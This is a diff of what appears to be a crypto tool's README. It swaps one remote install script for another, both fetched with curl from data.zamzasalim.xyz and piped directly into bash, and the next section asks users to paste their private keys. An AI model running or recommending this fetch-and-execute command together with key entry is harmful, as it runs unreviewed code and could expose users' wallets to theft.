@@ -12,7 +12,7 @@
 
 ## Install 
 ```
-bash <(curl -s https://data.zamzasalim.xyz/file/uploads/bybitgamefi.sh)
+bash <(curl -s https://data.zamzasalim.xyz/file/uploads/initverse.sh)
 ```
 
 ## Paste PrivateKeys
